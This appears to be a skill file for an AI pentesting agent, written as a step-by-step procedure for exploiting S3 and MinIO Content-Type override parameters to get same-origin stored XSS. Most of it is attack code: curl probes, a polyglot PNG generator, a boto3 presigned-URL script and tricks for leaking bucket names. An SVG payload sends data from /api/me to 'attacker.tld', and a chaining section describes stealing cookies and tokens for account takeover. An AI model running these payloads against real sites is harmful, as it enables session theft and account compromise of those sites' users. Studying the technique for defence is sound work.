---
name: Object Storage Content-Type Override to Stored XSS
description: Weaponize public S3/MinIO buckets by overriding the served Content-Type to turn uploaded files into same-origin stored XSS, bypassing all upload-time validation.
tags: [cloud, object-storage, s3, minio, xss, misconfig]
recommended_tools: [curl, http_request, http_repeater, python3, execute_command, dalfox_xss_scan]
vuln_classes: [misconfig, xss]
domain: cloud
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [recon/s3-minio-content-type-xss/SKILL.md]}
---

# Object Storage Content-Type Override to Stored XSS

Exploit public cloud object stores (AWS S3, MinIO, and S3-compatible systems) by overriding the `Content-Type` response header via query parameters. When a target serves user-uploaded files from its own origin (e.g. `cdn.target.com` or `target.com/uploads/`), a successful override turns a stored HTML/JS payload into **same-origin stored XSS** — bypassing every upload-time validation the application performed (extension whitelists, magic-byte checks, forced Content-Type), because the override happens at serve time, not upload time.

The core primitive: S3-style stores honor `response-content-type` (and related `response-*`) request parameters that let the client dictate what `Content-Type` the server returns. A file the app stored as `image/png` can be served as `text/html`, and the browser renders it as an HTML document.

CWE-79 (stored XSS) chained with CWE-16 / CWE-284 (misconfigured public bucket serving overridable headers).

## When to Use

- Target serves user-uploaded files (images, avatars, attachments, exports) from a public bucket.
- Files are served under the target's own domain or subdomain — NOT a random third-party storage domain. Same-origin is the whole point.
- Upload validation looks solid (extension whitelist, magic-byte check, forced Content-Type). The override sidesteps all of it at serve time.
- A bucket object URL responds to `?response-content-type=` with a changed `Content-Type`.
- The bucket returns an AWS `SignatureDoesNotMatch` / `AccessDenied` error that leaks the real bucket host and region.

## Prerequisites

- `curl` / `http_request` and `python3` (with `boto3` for the signed-S3 path).
- At least one public object URL served from storage.
- For AWS S3 exploitation: your own AWS account credentials (free tier is sufficient — you re-sign the request, you do not need access to the target bucket).

## Gate 0 — Deterministic detection

Do not proceed until you have proven the override actually changes the served `Content-Type`. This is a binary, non-speculative check.

```bash
OBJECT_URL="https://cdn.target.com/uploads/avatar123.png"

# Baseline: what does the object serve normally?
curl -skI "$OBJECT_URL" | grep -i '^content-type'

# Override attempt
curl -skI "${OBJECT_URL}?response-content-type=text/html" | grep -i '^content-type'
```

Equivalent with `http_request` (repeat the two requests, diff the `Content-Type` header).

Decision table:

| Response to override | Meaning | Next |
|---|---|---|
| `Content-Type: text/html` (changed) | MinIO / S3-compatible — override works anonymously | Phase 3 |
| `Request specific response headers cannot be used for anonymous GET requests` | AWS S3 — override requires a signed request | Phase 4 |
| `Content-Type` unchanged | Override not honored on this path | Try other params / a direct-bucket URL / abandon |

Gate 0 passes only when the served `Content-Type` is attacker-controlled AND the object URL is same-origin with the target (Phase 5).

## Procedure

### Phase 1 — Identify public objects

Find uploaded objects served publicly and detect the backing store.

```bash
# Probe common upload/serving paths
for path in /uploads/ /media/ /static/uploads/ /cdn/ /files/ /assets/img/ /storage/ /avatars/; do
  curl -skI "https://target.com${path}" | grep -Ei 'HTTP/|content-type|x-amz|server'
done

# Grep the homepage/JS for storage signatures and bucket hosts
curl -sk "https://target.com/" \
  | grep -oP '(?:s3[.-]|amazonaws\.com|minio|storage\.googleapis|digitaloceanspaces|r2\.cloudflarestorage)[^"'"'"'\s]{5,80}'
```

The `x-amz-*` response headers, an `AmazonS3` / `MinIO` `Server` header, or an XML error body with `<Code>` elements confirm an S3-style backend. Note the object key structure — you need a key you can influence via the upload flow.

### Phase 2 — Test Content-Type override (see Gate 0)

Beyond `Content-Type`, S3/MinIO expose a family of `response-*` override parameters. Enumerate which are honored — `response-content-disposition` in particular can force inline rendering / download and matters for delivery:

| Parameter | Header overridden | Offensive use |
|---|---|---|
| `response-content-type` | `Content-Type` | Force `text/html`, `application/xhtml+xml`, `image/svg+xml`, `text/xml` |
| `response-content-disposition` | `Content-Disposition` | Force `inline` rendering instead of `attachment` download |
| `response-cache-control` | `Cache-Control` | Influence caching of the poisoned response |
| `response-content-encoding` | `Content-Encoding` | Edge cases with gzip/br handling |
| `response-content-language` | `Content-Language` | Minor |

If `text/html` is filtered or sanitized on upload but `image/svg+xml` is not, an SVG payload is often the cleaner path (SVG executes inline `<script>` when rendered as a document):

```bash
curl -skI "${OBJECT_URL}?response-content-type=image/svg+xml" | grep -i '^content-type'
```

### Phase 3 — MinIO / S3-compatible exploitation (anonymous override)

MinIO and many S3-compatible stores honor the override for anonymous GETs. Deliver a payload that satisfies the upload validator yet renders as script.

Polyglot PNG (valid PNG magic bytes + HTML/JS body):

```python
# poly_png.py — passes magic-byte checks, renders as HTML under Content-Type override
payload = b'\x89PNG\r\n\x1a\n' + b'<script>alert(document.domain)</script>'
open('evil.png', 'wb').write(payload)
```

SVG payload (when `image/svg+xml` is accepted on upload or forced via override):

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('/api/me').then(r=>r.text()).then(d=>fetch('//attacker.tld/?'+btoa(d)))</script>
</svg>
```

Upload through the application's normal flow, then serve with the override so the browser treats it as a document:

```bash
# Renders as HTML/SVG in a real browser and executes the script
curl -sk "https://cdn.target.com/uploads/evil.png?response-content-type=text/html"
```

Automated XSS confirmation on the serve URL (headless browser execution) can be done with `dalfox_xss_scan` pointed at the override URL, but the definitive proof is a browser visit showing `document.domain`.

### Phase 4 — AWS S3 exploitation (signed override)

AWS S3 rejects anonymous `response-*` overrides. Re-sign the GET with **your own** AWS credentials — SigV4 signing does not require any access to the target bucket, only that the object is publicly readable.

```python
# s3_xss.py <bucket> <key> <region> <endpoint> [content-type]
import sys, boto3
from botocore.client import Config
from botocore import UNSIGNED  # not used here; presign needs creds but object is public-read

def generate_s3_xss_url(bucket, key, region, endpoint_url, content_type="text/html"):
    s3 = boto3.client(
        "s3",
        region_name=region,
        endpoint_url=endpoint_url,
        config=Config(signature_version="s3v4", s3={"addressing_style": "virtual"}),
    )
    return s3.generate_presigned_url(
        "get_object",
        Params={"Bucket": bucket, "Key": key, "ResponseContentType": content_type},
        ExpiresIn=3600,
    )

if __name__ == "__main__":
    bucket, key, region, endpoint = sys.argv[1:5]
    ctype = sys.argv[5] if len(sys.argv) > 5 else "text/html"
    print(generate_s3_xss_url(bucket, key, region, endpoint, ctype))

# Example:
# python3 s3_xss.py target-bucket uploads/avatar.png us-east-1 https://s3.us-east-1.amazonaws.com text/html
```

**Leaking the bucket name/region.** If the canonical bucket host is unknown, send a request signed with a deliberately wrong host or region to trigger `SignatureDoesNotMatch`. S3's error XML echoes the `CanonicalRequest` / `StringToSign`, which contains the real bucket host and region. `AccessDenied` and `PermanentRedirect` (`x-amz-bucket-region` header) responses also leak region. Feed the recovered values back into `s3_xss.py`.

### Phase 5 — Verify same-origin impact

The XSS only matters if the object is served under the target's own origin.

```bash
# Same-origin check
echo "$OBJECT_URL" | grep -qE '^https?://([a-z0-9-]+\.)?target\.com/' \
  && echo "SAME-ORIGIN XSS" || echo "Cross-origin — low impact"
```

Same-origin means the payload runs with access to the target's cookies, `localStorage`, and authenticated API endpoints — full stored XSS. If the object lives on `*.s3.amazonaws.com` or a shared storage domain, it executes in an isolated origin with no access to the target session (report as informational at most).

## Pitfalls

- **Cross-origin buckets are low impact.** A bucket on `s3.amazonaws.com` or a random storage domain gives an isolated origin. Confirm the serving host is the target's before spending effort.
- **The override must be honored.** Not every S3-compatible store supports `response-*`. Some (GCS, R2, DigitalOcean Spaces) use different parameter names or require signing — enumerate per-store.
- **Upload validation still gates delivery.** The file must pass upload-time checks to reach the bucket. Use polyglots (valid magic bytes + payload) or an accepted `image/svg+xml`.
- **Presigned S3 URLs expire.** `ExpiresIn` bounds the working window (max 7 days for SigV4). The link dies after expiry — regenerate for re-testing.
- **CDN caching in front of the bucket.** CloudFront/Fastly may cache the original `Content-Type` and ignore query overrides, or strip the `response-*` params entirely. Test BOTH the CDN URL and the direct-bucket URL.
- **Content sniffing / `X-Content-Type-Options: nosniff`.** If the response sets `nosniff`, the forced `Content-Type` is authoritative (good for the attacker when forcing `text/html`; blocks image-sniffing tricks). Check the served headers.

## Validation / Proof

1. Gate 0: `curl -skI "${URL}?response-content-type=text/html"` returns a changed `Content-Type: text/html`.
2. Upload a distinct test payload through the application's normal upload flow.
3. Visit the uploaded object with the override parameter in a real browser and confirm JavaScript executes (`alert(document.domain)` or an out-of-band callback).
4. Confirm same-origin: the object URL shares the target's registrable domain.
5. Document the full chain: upload-validation bypass technique -> override parameter (and its exact value) -> same-origin stored XSS, with the executing payload and the affected origin.

## Chaining

- **Account takeover:** same-origin XSS -> exfiltrate session cookies / bearer tokens from `localStorage` -> authenticated API abuse.
- **Bucket discovery -> exploitation:** recover bucket name/region from `SignatureDoesNotMatch` leaks (Phase 4) or from JS bundles, then presign the override URL.
- **SVG/XML pivot:** if `text/html` is blocked on upload, force `image/svg+xml` or `text/xml` (SVG script execution / XXE surface on some XML parsers).
- **CSP evaluation:** a strict same-origin CSP may still block inline script — test `image/svg+xml` with external script refs allowed by the policy, or fall back to HTML-injection primitives.
